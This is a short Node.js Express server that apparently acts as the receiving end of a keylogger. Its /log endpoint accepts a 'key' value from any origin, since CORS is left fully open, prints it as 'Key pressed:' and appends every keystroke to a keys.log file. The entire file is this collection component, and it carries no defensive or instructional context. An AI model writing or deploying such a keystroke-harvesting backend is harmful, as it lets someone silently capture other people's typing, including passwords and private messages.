const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(express.json());

app.use(cors());

app.post('/log', (req, res) => {
    const key = req.body.key;
    console.log('Key pressed:', key);
    fs.appendFileSync('keys.log', key + '\n');
    res.status(200).send('Logged');
});

app.listen(PORT, () => {
    console.log(`Server läuft auf http://localhost:${PORT}`);
});
